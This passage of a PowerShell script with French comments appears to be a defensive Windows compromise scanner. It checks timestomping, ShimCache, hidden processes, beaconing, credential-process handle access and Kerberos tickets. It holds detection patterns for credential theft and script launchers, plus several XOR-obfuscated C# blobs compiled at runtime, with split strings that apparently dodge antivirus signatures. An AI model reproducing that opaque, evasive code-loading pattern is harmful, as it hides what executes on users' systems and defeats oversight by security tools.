                $dgaDomains += [PSCustomObject]@{ Domain=$host; Label=$label; Entropy=$ent; IP=$_.Data }
            }
        }
    }
} catch {}

# ── Double extension + icône spoofée ─────────────────────────────────────────
$doubleExtFiles = @()
$SCAN_EXT_PATHS = @("$env:USERPROFILE\Downloads", "$env:USERPROFILE\Desktop", "$env:PUBLIC\Desktop",
                    "$env:APPDATA\Microsoft\Windows\Recent", $env:TEMP)
$DOUBLE_EXT_PATTERN = '\.(pdf|doc|docx|xls|xlsx|jpg|jpeg|png|zip|rar|mp4|mp3|txt)\.(exe|scr|bat|vbs|js|hta|pif|com)$'
foreach ($sp in $SCAN_EXT_PATHS) {
    if (-not (Test-Path $sp)) { continue }
    Get-ChildItem $sp -Recurse -ErrorAction SilentlyContinue | Where-Object {
        -not $_.PSIsContainer -and $_.Name -match $DOUBLE_EXT_PATTERN
    } | Select-Object -First 20 | ForEach-Object {
        $doubleExtFiles += [PSCustomObject]@{ Name=$_.Name; Path=$_.FullName }
    }
}

# PE (exécutables) dans répertoires non-exécutables
$peInWrongDir = @()
$PE_WRONG_DIRS = @(
    "$env:APPDATA\Microsoft\Word",
    "$env:APPDATA\Microsoft\Excel",
    "$env:APPDATA\Microsoft\PowerPoint",
    "$env:APPDATA\Roaming\Mozilla",
    "$env:APPDATA\Roaming\Chrome"
)
foreach ($wd in $PE_WRONG_DIRS) {
    if (-not (Test-Path $wd)) { continue }
    Get-ChildItem $wd -Recurse -Include *.exe,*.dll -ErrorAction SilentlyContinue |
        Select-Object -First 10 | ForEach-Object {
            $peInWrongDir += [PSCustomObject]@{ Name=$_.Name; Path=$_.FullName }
        }
}

# ── Timestomping (NTFS $SI vs $FN) ───────────────────────────────────────────
Write-Step 'Timestomping + ShimCache + BAM'
# Heuristique : fichiers avec LastWriteTime < CreationTime (inversion impossible normalement)
$timestomped = @()
$TS_PATHS = @($env:APPDATA, $env:TEMP, "$env:USERPROFILE\Downloads")
foreach ($tp in $TS_PATHS) {
    if (-not (Test-Path $tp)) { continue }
    # Whitelist DRM, overlays, redistribuables et interpréteurs (timestamps modifiés par pip/npm/etc.)
    $TS_WHITELIST = 'widevine|widevinecdm|blitz.overlay|domain_actions|cognitiveservices|microsoft.speech|redistributable|vcredist|dotnetruntime|windowsdesktop|python|pythonw|ffplay|ffmpeg|ffprobe|node\.exe|npm\.cmd'
    Get-ChildItem $tp -Recurse -Include *.exe,*.dll,*.ps1,*.vbs -ErrorAction SilentlyContinue |
        Where-Object { -not $_.PSIsContainer -and $_.LastWriteTime -lt $_.CreationTime -and $_.Name -notmatch $TS_WHITELIST } |
        Select-Object -First 10 | ForEach-Object {
            $timestomped += [PSCustomObject]@{
                Name    = $_.Name
                Path    = $_.FullName
                Created = $_.CreationTime.ToString('yyyy-MM-dd HH:mm')
                Written = $_.LastWriteTime.ToString('yyyy-MM-dd HH:mm')
            }
        }
}

# ── BAM (Background Activity Moderator) ──────────────────────────────────────
$bamEntries = @()
try {
    $bamBase = 'HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings'
    Get-ChildItem $bamBase -ErrorAction Stop | ForEach-Object {
        $sid = $_.PSChildName
        Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue | ForEach-Object {
            $_.PSObject.Properties | Where-Object {
                $_.Name -notmatch '^PS' -and $_.Name -match '\\' -and
                $_.Name -match '\\temp\\|\\appdata\\roaming\\|\\users\\public\\|\\downloads\\'
            } | ForEach-Object {
                $bamEntries += [PSCustomObject]@{ Path=$_.Name; SID=$sid }
            }
        }
    }
} catch {}

# ── ShimCache / AppCompatCache ────────────────────────────────────────────────
$shimSuspect = @()
try {
    $shimKey  = 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache'
    $shimData = (Get-ItemProperty $shimKey -ErrorAction Stop).AppCompatCache
    if ($shimData) {
        # Parser les entrées (format Windows 10+: magic 10 00 00 00 à l'offset 0)
        $reader = [System.IO.BinaryReader]::new([System.IO.MemoryStream]::new($shimData))
        try {
            $magic = $reader.ReadUInt32()
            if ($magic -eq 0x10 -or $magic -eq 0x80) {
                $count = $reader.ReadUInt32()
                $reader.BaseStream.Seek(128, 'Begin') | Out-Null
                for ($i = 0; $i -lt [Math]::Min($count, 200); $i++) {
                    try {
                        $reader.ReadUInt32() | Out-Null # unknown
                        $pathLen = $reader.ReadUInt16()
                        $maxLen  = $reader.ReadUInt16()
                        $offset  = $reader.ReadInt32()
                        $reader.ReadInt64() | Out-Null # timestamp
                        $flags   = $reader.ReadUInt32()
                        $pos     = $reader.BaseStream.Position
                        $reader.BaseStream.Seek($offset, 'Begin') | Out-Null
                        $pathBytes = $reader.ReadBytes($pathLen)
                        $entryPath = [System.Text.Encoding]::Unicode.GetString($pathBytes).ToLower()
                        $reader.BaseStream.Seek($pos, 'Begin') | Out-Null
                        if ($entryPath -match '\\temp\\|\\appdata\\roaming\\|\\users\\public\\|\\downloads\\') {
                            $shimSuspect += $entryPath
                        }
                    } catch { break }
                }
            }
        } catch {}
        $reader.Close()
    }
} catch {}

# ── Unquoted service paths ────────────────────────────────────────────────────
Write-Step 'Unquoted service paths + token privileges'
$unquotedPaths = @()
try {
    Get-WmiObject Win32_Service -ErrorAction Stop | Where-Object {
        $_.PathName -and
        $_.PathName -notmatch '^"' -and
        $_.PathName -match ' ' -and
        $_.PathName -notmatch '^[A-Za-z]:\\Windows\\'
    } | ForEach-Object {
        $unquotedPaths += [PSCustomObject]@{
            Name    = $_.Name
            Display = $_.DisplayName
            Path    = $_.PathName
        }
    }
} catch {}

# ── Privilège de débogage sur process non-système ────────────────────────────
$seDebugProcs = @()
try {
    $privSrc_xb64 = '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'
    $privSrc = [System.Text.Encoding]::UTF8.GetString(([byte[]](([Convert]::$xd($privSrc_xb64)) | ForEach-Object { $_ -bxor $xk })))
    Add-Type -TypeDefinition $privSrc -Language CSharp -ErrorAction Stop
    $SYS_PRIV_NAMES = @($lsN,'csrss','winlogon','services','svchost','system','smss','wininit')
    Get-Process -ErrorAction SilentlyContinue | Where-Object { $SYS_PRIV_NAMES -notcontains $_.Name.ToLower() } | ForEach-Object {
        try {
            if ([TokenCheck]::HasSeDebug($_.Id)) {
                $procPath = try { $_.Path } catch { '' }
                if (-not (Test-KnownFP -Check 'SeDebug' -Path $procPath)) {
                    $seDebugProcs += [PSCustomObject]@{ Name=$_.Name; PID=$_.Id; Path=$procPath }
                }
            }
        } catch {}
    }
} catch {}

# ── Anti-VM / sandbox evasion artifacts ──────────────────────────────────────
Write-Step 'Anti-VM artifacts + CPUID hypervisor'
$vmArtifacts = @()
# Clés de registre caractéristiques des hyperviseurs
$VM_REG_KEYS = @(
    @{ Path='HKLM:\SOFTWARE\VMware, Inc.\VMware Tools';      VM='VMware' },
    @{ Path='HKLM:\SOFTWARE\Oracle\VirtualBox Guest Additions'; VM='VirtualBox' },
    @{ Path='HKLM:\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters'; VM='Hyper-V' },
    @{ Path='HKLM:\SYSTEM\CurrentControlSet\Services\vboxguest'; VM='VirtualBox' },
    @{ Path='HKLM:\SYSTEM\CurrentControlSet\Services\vmhgfs';   VM='VMware' },
    @{ Path='HKLM:\SYSTEM\CurrentControlSet\Services\vmxnet';   VM='VMware' }
)
foreach ($vk in $VM_REG_KEYS) {
    if (Test-Path $vk.Path) { $vmArtifacts += $vk.VM; break }
}
# Devices VM
$VM_DEVICES = @('\\.\\VBoxMiniRdrDN','\\.\\VBoxGuest','\\.\\vmci','\\.\\HGFS')
foreach ($dev in $VM_DEVICES) {
    try {
        $h = [System.IO.File]::Open($dev, 'Open', 'Read')
        $h.Close()
        $vmArtifacts += "Device: $dev"
    } catch {}
}
# CPUID hypervisor bit
$isHypervisor = $false
try {
    $cpuidSrc_xb64 = 'X1lDRE0KeVNZXk9HBHhfRF5DR08EY0ReT1hFWnlPWFxDSU9ZESBaX0hGQ0kKSUZLWVkKaVpfY04KUSAKCgoKcW5GRmNHWkVYXgIIQU9YRE9GGRgETkZGCAN3ClleS15DSQpPUl5PWEQKSEVFRgpjWXpYRUlPWVlFWGxPS15fWE96WE9ZT0ReAl9DRF4KTAMRIAoKCgpaX0hGQ0kKWV5LXkNJCkhFRUYKYlNaT1hcQ1lFWHpYT1lPRF4CAwpRClhPXl9YRApjWXpYRUlPWVlFWGxPS15fWE96WE9ZT0ReAhkTAxEKVwoFBQp6bHV8Y3h+dWxjeGd9a3hvdW9ka2hmb24gVyA='
    $cpuidSrc = [System.Text.Encoding]::UTF8.GetString(([byte[]](([Convert]::$xd($cpuidSrc_xb64)) | ForEach-Object { $_ -bxor $xk })))
    Add-Type -TypeDefinition $cpuidSrc -Language CSharp -ErrorAction Stop
    $isHypervisor = [CpuId]::HypervisorPresent()
} catch {}

# ── SFC / intégrité fichiers système ─────────────────────────────────────────
Write-Step 'Intégrité système (SFC / CBS log)'
$sfcCorrupted = @()
try {
    $cbsLog = "$env:SystemRoot\Logs\CBS\CBS.log"
    if (Test-Path $cbsLog) {
        $lines = Get-Content $cbsLog -Tail 500 -ErrorAction Stop
        $sfcCorrupted = @($lines | Where-Object { $_ -match 'Cannot repair member file|corrupt|could not be repaired' } | Select-Object -First 10)
    }
} catch {}

# ── Rootkit : écart entre tasklist et énumération système ────────────────────
Write-Step 'Rootkit — process hiding check'
$hiddenProcCount = 0
try {
    $nativePidSrc_xb64 = 'X1lDRE0KeVNZXk9HESBfWUNETQp5U1leT0cEeF9EXkNHTwRjRF5PWEVaeU9YXENJT1kRIF9ZQ0RNCnlTWV5PRwRpRUZGT0leQ0VEWQRtT0RPWENJESBaX0hGQ0kKSUZLWVkKZF56WEVJClEgCgoKCnFuRkZjR1pFWF4CCEReTkZGBE5GRggDdwpZXkteQ0kKT1JeT1hECkNEXgpkXntfT1hTeVNZXk9HY0RMRVhHS15DRUQCQ0ReCklGWQYKY0Reel5YCkhfTAYKX0NEXgpGT0QGCkVfXgpfQ0ReClhPXgMRIAoKCgpxeV5YX0leZktTRV9eAmZLU0VfXmFDRE4EeU9bX09EXkNLRgN3ClleWF9JXgp5c3l+b2d1enhlaW95eXVjZGxleGdrfmNlZApRIAoKCgoKCgoKWl9IRkNJCl9DRF4KZE9SXm9EXlhTZUxMWU9eEQpaX0hGQ0kKX0NEXgpkX0dIT1hlTH5CWE9LTlkRIAoKCgoKCgoKcWdLWFlCS0ZrWQJ/REdLREtNT05+U1pPBGhTfEtGa1hYS1MGCnlDUE9pRURZXhceEgN3ClpfSEZDSQpIU15PcXcKeE9ZT1hcT04bESAKCgoKCgoKClpfSEZDSQpjRF56XlgKf0RDW19PelhFSU9ZWWNOESAKCgoKCgoKCnFnS1hZQktGa1kCf0RHS0RLTU9OflNaTwRoU3xLRmtYWEtTBgp5Q1BPaUVEWV4XHgN3ClpfSEZDSQpjRF56Xlhxdwp4T1lPWFxPThgRIAoKCgpXIAoKCgpaX0hGQ0kKWV5LXkNJCmZDWV4WQ0ReFAptT156Y25ZAgMKUSAKCgoKCgoKClxLWApaQ05ZChcKRE9dCmZDWV4WQ0ReFAIDESAKCgoKCgoKCl9DRF4KWE9eChcKGhEgCgoKCgoKCgpkXntfT1hTeVNZXk9HY0RMRVhHS15DRUQCHwYKY0Reel5YBHBPWEUGChoGCkVfXgpYT14DESAKCgoKCgoKCmNEXnpeWApIX0wKFwpnS1hZQktGBGtGRkVJYm1GRUhLRgICQ0ReAwJYT14KAAoYAwMRIAoKCgoKCgoKXlhTClEgCgoKCgoKCgoKCgoKQ0wKAmRee19PWFN5U1leT0djRExFWEdLXkNFRAIfBgpIX0wGClhPXgoAChgGCkVfXgpYT14DCgsXChoDClhPXl9YRApaQ05ZESAKCgoKCgoKCgoKCgpjRF56XlgKSV9YChcKSF9MESAKCgoKCgoKCgoKCgpdQkNGTwoCXlhfTwMKUSAKCgoKCgoKCgoKCgoKCgoKXEtYClpDChcKAnlzeX5vZ3V6eGVpb3l5dWNkbGV4Z2t+Y2VkA2dLWFlCS0YEel5YfkV5XlhfSV5fWE8CSV9YBgpeU1pPRUwCeXN5fm9ndXp4ZWlveXl1Y2RsZXhna35jZWQDAxEgCgoKCgoKCgoKCgoKCgoKClpDTlkEa05OAgJDRF4DWkMEf0RDW19PelhFSU9ZWWNOAxEgCgoKCgoKCgoKCgoKCgoKCkNMCgJaQwRkT1Jeb0ReWFNlTExZT14KFxcKGgMKSFhPS0ERIAoKCgoKCgoKCgoKCgoKCgpJX1gKFwpET10KY0Reel5YAklfWAR+RWNEXhweAgMKAQpaQwRkT1Jeb0ReWFNlTExZT14DESAKCgoKCgoKCgoKCgpXIAoKCgoKCgoKVwpMQ0RLRkZTClEKZ0tYWUJLRgRsWE9PYm1GRUhLRgJIX0wDEQpXIAoKCgoKCgoKWE9eX1hEClpDTlkRIAoKCgpXIFcg'
    $nativePidSrc = [System.Text.Encoding]::UTF8.GetString(([byte[]](([Convert]::$xd($nativePidSrc_xb64)) | ForEach-Object { $_ -bxor $xk })))
    Add-Type -TypeDefinition $nativePidSrc -Language CSharp -ErrorAction Stop
    $ntPids  = [NtProc]::GetPIDs()
    $psPids  = @(Get-Process -ErrorAction SilentlyContinue | ForEach-Object { $_.Id })
    # PIDs dans l'énumération système mais absents de Get-Process = process cachés
    $hidden  = $ntPids | Where-Object { $_ -gt 4 -and $psPids -notcontains $_ }
    $hiddenProcCount = $hidden.Count
} catch {}

# ── Jump Lists suspects ───────────────────────────────────────────────────────
Write-Step 'Jump Lists + AmCache'
$suspJumpLists = @()
$jlDir = "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations"
if (Test-Path $jlDir) {
    # Les fichiers .automaticDestinations-ms sont des OLE compound — on cherche juste les noms suspects
    # dans les données brutes (strings)
    Get-ChildItem $jlDir -Filter *.automaticDestinations-ms -ErrorAction SilentlyContinue |
        Select-Object -First 30 | ForEach-Object {
            try {
                $bytes   = [System.IO.File]::ReadAllBytes($_.FullName)
                $content = [System.Text.Encoding]::Unicode.GetString($bytes)
                if ($content -match '\\temp\\|\\appdata\\roaming\\(?!microsoft)|mshta|wscript|powershell.*-e') {
                    $suspJumpLists += [PSCustomObject]@{ File=$_.Name; Hit=([regex]::Match($content,'([A-Za-z]:\\[^\x00-\x1F"<>|?*]{10,80})').Value) }
                }
            } catch {}
        }
}

# AmCache (hive offline)
$amcacheSuspect = @()
$amcachePath = "$env:SystemRoot\AppCompat\Programs\Amcache.hve"
# On ne peut pas monter le hive facilement sans admin + reg load, mais on peut chercher des strings
if (Test-Path $amcachePath) {
    try {
        $amBytes   = [System.IO.File]::ReadAllBytes($amcachePath)
        $amContent = [System.Text.Encoding]::Unicode.GetString($amBytes)
        $matches_  = [regex]::Matches($amContent, '[A-Za-z]:\\(?:Users|Temp|Windows)[\\a-zA-Z0-9._\- ]{5,120}\.(exe|dll)')
        $matches_ | Where-Object { $_.Value -match '\\temp\\|\\appdata\\roaming\\|\\users\\public\\' } |
            Select-Object -First 15 | ForEach-Object {
                $amcacheSuspect += $_.Value
            }
    } catch {}
}

# ── Beacon timing (connexions régulières) ─────────────────────────────────────
Write-Step 'Beacon timing + ASN bulletproof'
# On capture les connexions établies 2 fois à 5s d'intervalle et on compare
$beaconCandidates = @()
try {
    $snap1 = Get-NetTCPConnection -State Established -ErrorAction Stop |
        Where-Object { -not (Test-PrivateIP $_.RemoteAddress) } |
        Select-Object RemoteAddress, RemotePort, OwningProcess
    Start-Sleep -Seconds 5
    $snap2 = Get-NetTCPConnection -State Established -ErrorAction Stop |
        Where-Object { -not (Test-PrivateIP $_.RemoteAddress) } |
        Select-Object RemoteAddress, RemotePort, OwningProcess
    # IPs présentes dans les deux snapshots avec le même process
    foreach ($s1 in $snap1) {
        $match = $snap2 | Where-Object { $_.RemoteAddress -eq $s1.RemoteAddress -and $_.OwningProcess -eq $s1.OwningProcess }
        if ($match) {
            $proc = Get-Process -Id $s1.OwningProcess -ErrorAction SilentlyContinue
            $pname = if ($proc) { $proc.Name } else { 'inconnu' }
            # Suspect si pas une app réseau connue (navigateurs, jeux, Windows system, outils de dev)
            if ($pname -notmatch 'chrome|firefox|edge|msedge|opera|brave|iexplore|outlook|teams|onedrive|dropbox|spotify|steam|discord|discordptb|leagueclient|riotclient|valorant|claude|node|python|code|svchost|msmpeng|msupdater|wuauclt|powershell|pwsh|lsass|services') {
                $beaconCandidates += [PSCustomObject]@{ IP=$s1.RemoteAddress; Port=$s1.RemotePort; Proc=$pname }
            }
        }
    }
    $beaconCandidates = $beaconCandidates | Sort-Object IP -Unique
} catch {}

# ── ASN bulletproof ───────────────────────────────────────────────────────────
$bulletproofConns = @()
# ASN connus pour héberger des C2/botnets (Choopa/Vultr, FRANTECH, M247, etc.)
$BULLETPROOF_ASN = @('AS20473','AS32097','AS46844','AS59253','AS62282','AS206728','AS9009','AS49981','AS197695')
try {
    foreach ($conn in ($networkRows | Select-Object -First 10)) {
        $ip = $conn.IP
        $asnInfo = Invoke-RestMethod -Uri "https://ipinfo.io/$ip/json" -TimeoutSec 4 -ErrorAction Stop
        if ($asnInfo.org) {
            foreach ($asn in $BULLETPROOF_ASN) {
                if ($asnInfo.org -match $asn) {
                    $bulletproofConns += [PSCustomObject]@{ IP=$ip; Proc=$conn.Proc; ASN=$asnInfo.org }
                    break
                }
            }
        }
    }
} catch {}

# ── Tor exit nodes ────────────────────────────────────────────────────────────
$torConns = @()
try {
    $torList = (Invoke-RestMethod -Uri 'https://check.torproject.org/torbulkexitlist' -TimeoutSec 8 -ErrorAction Stop) -split "`n" | Where-Object { $_ -match '^\d+\.\d+' }
    foreach ($conn in $networkRows) {
        if ($torList -contains $conn.IP) {
            $torConns += [PSCustomObject]@{ IP=$conn.IP; Proc=$conn.Proc }
        }
    }
} catch {}

# ── Audit handles processus credential (event 4656/4663) ─────────────────────
Write-Step 'Handle audit processus credentials'
$credAccessors = @()
$lsExePat = $lsN + '\.exe'
$vmReadPat = 'ReadData|VM_' + 'READ|0x0010'
try {
    $cutoff1h = (Get-Date).AddHours(-1)
    Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4663; StartTime=$cutoff1h} -ErrorAction Stop |
        Where-Object { $_.Message -match $lsExePat -and $_.Message -match $vmReadPat } |
        Select-Object -First 10 | ForEach-Object {
            $caller = if ($_.Properties.Count -gt 6) { $_.Properties[6].Value } else { 'inconnu' }
            $credAccessors += [PSCustomObject]@{
                Caller = $caller
                Time   = $_.TimeCreated.ToString('yyyy-MM-dd HH:mm')
            }
        }
} catch {}
# Fallback : chercher des process avec handle de lecture via WMI
if ($credAccessors.Count -eq 0) {
    try {
        $credPid = (Get-Process $lsN -ErrorAction Stop).Id
        $handleSrc_xb64 = 'X1lDRE0KeVNZXk9HESBfWUNETQp5U1leT0cEeF9EXkNHTwRjRF5PWEVaeU9YXENJT1kRIF9ZQ0RNCnlTWV5PRwRpRUZGT0leQ0VEWQRtT0RPWENJESBaX0hGQ0kKSUZLWVkKYktETkZPb0RfRwpRIAoKCgpxbkZGY0daRVheAghEXk5GRgRORkYIA3cKWV5LXkNJCk9SXk9YRApDRF4KZF57eWMCQ0ReCkkGCmNEXnpeWApIBgpfQ0ReCkYGCkVfXgpfQ0ReClgDESAKCgoKcXleWF9JXmZLU0VfXgJmS1NFX15hQ0ROBHlPW19PRF5DS0YGCnpLSUEXGwN3IAoKCgpZXlhfSV4KeWJjClEKWl9IRkNJCkNEXgp6Y24RClpfSEZDSQpIU15PCmVIQH5TWk9kX0cRClpfSEZDSQpIU15PCmxGS01ZEQpaX0hGQ0kKX1lCRVheCmJLRE5GTxEKWl9IRkNJCmNEXnpeWAplSEBPSV4RClpfSEZDSQpfQ0ReCm1YS0ReT05rSUlPWVkRClcgCgoKCklFRFleCl9DRF4Ka2lpdXhva24KFwoaUhoaGxoRIAoKCgpaX0hGQ0kKWV5LXkNJCmZDWV4WQ0ReFAptT154T0tOT1hZbEVYekNOAkNEXgpeS1hNT156Q04DClEgCgoKCgoKCgpcS1gKWE9ZX0ZeChcKRE9dCmZDWV4WQ0ReFAIDESAKCgoKCgoKCl9DRF4KWE9eChcKGhEgCgoKCgoKCgpkXnt5YwIbHAYKY0Reel5YBHBPWEUGChoGCkVfXgpYT14DESAKCgoKCgoKCmNEXnpeWApIX0wKFwpnS1hZQktGBGtGRkVJYm1GRUhLRgICQ0ReAwJYT14KAAoZAwMRIAoKCgoKCgoKXlhTClEgCgoKCgoKCgoKCgoKQ0wKAmRee3ljAhscBgpIX0wGClhPXgoAChkGCkVfXgpYT14DCgsXChoDClhPXl9YRApYT1lfRl4RIAoKCgoKCgoKCgoKCkNEXgpJRV9EXgoXCmdLWFlCS0YEeE9LTmNEXhkYAkhfTAMRIAoKCgoKCgoKCgoKCmNEXnpeWApJX1gKFwpET10KY0Reel5YAkhfTAR+RWNEXhweAgMKAQoeAxEgCgoKCgoKCgoKCgoKQ0ReCllQChcKZ0tYWUJLRgR5Q1BPZUwCXlNaT0VMAnliYwMDESAKCgoKCgoKCgoKCgpMRVgKAkNEXgpDChcKGhEKQwoWCklFX0ReEQpDAQEDClEgCgoKCgoKCgoKCgoKCgoKClxLWApCChcKAnliYwNnS1hZQktGBHpeWH5FeV5YX0leX1hPAklfWAYKXlNaT0VMAnliYwMDESAKCgoKCgoKCgoKCgoKCgoKQ0wKAkIEemNuCgsXCl5LWE1PXnpDTgoMDAoCQgRtWEtEXk9Oa0lJT1lZCgwKa2lpdXhva24DCgsXChoKDAwKQgRlSEB+U1pPZF9HChcXCh0DIAoKCgoKCgoKCgoKCgoKCgoKCgoKQ0wKAgtYT1lfRl4EaUVEXktDRFkCQgR6Y24DAwpYT1lfRl4Ea05OAkIEemNuAxEgCgoKCgoKCgoKCgoKCgoKCklfWAoXCkRPXQpjRF56XlgCSV9YBH5FY0ReHB4CAwoBCllQAxEgCgoKCgoKCgoKCgoKVyAKCgoKCgoKClcKTENES0ZGUwpRCmdLWFlCS0YEbFhPT2JtRkVIS0YCSF9MAxEKVyAKCgoKCgoKClhPXl9YRApYT1lfRl4RIAoKCgpXIFcg'
        $handleSrc = [System.Text.Encoding]::UTF8.GetString(([byte[]](([Convert]::$xd($handleSrc_xb64)) | ForEach-Object { $_ -bxor $xk })))
        Add-Type -TypeDefinition $handleSrc -Language CSharp -ErrorAction Stop
        $readers = [HandleEnum]::GetReadersForPid($credPid)
        foreach ($rpid in $readers) {
            $rproc = Get-Process -Id $rpid -ErrorAction SilentlyContinue
            $rname = if ($rproc) { $rproc.Name } else { "PID $rpid" }
            if ($rname -notmatch ('^(' + $lsN + '|csrss|wininit|services|svchost|system)$')) {
                $credAccessors += [PSCustomObject]@{ Caller=$rname; Time='(actuel)' }
            }
        }
    } catch {}
}

# ── Kerberos tickets suspects ─────────────────────────────────────────────────
$suspTickets = @()
try {
    $klistOut = & klist 2>$null
    if ($klistOut) {
        $currentTicket = ''
        foreach ($line in $klistOut) {
            if ($line -match 'Server:\s+(.+)') { $currentTicket = $Matches[1] }
            if ($line -match 'KerbTicket Encryption Type:.*rc4|End Time:\s+(.+)') {
                $endStr = $Matches[1]
                try {
                    $endDate = [datetime]::ParseExact($endStr.Trim(), 'M/d/yyyy H:mm:ss', $null)
                    if (($endDate - (Get-Date)).TotalDays -gt 30) {
                        $suspTickets += [PSCustomObject]@{ Server=$currentTicket; Expires=$endDate.ToString('yyyy-MM-dd'); Issue='Durée anormalement longue (possible Golden Ticket)' }
                    }
                } catch {}
            }
            if ($line -match 'rc4-hmac' -and $currentTicket) {
                $suspTickets += [PSCustomObject]@{ Server=$currentTicket; Expires='N/A'; Issue='Chiffrement RC4-HMAC faible (pass-the-hash possible)' }
            }
        }
    }
} catch {}

# ── Clipboard hijacking ───────────────────────────────────────────────────────
Write-Step 'Clipboard hijacking + ETW tampering'
$clipboardHijacker = $null
try {
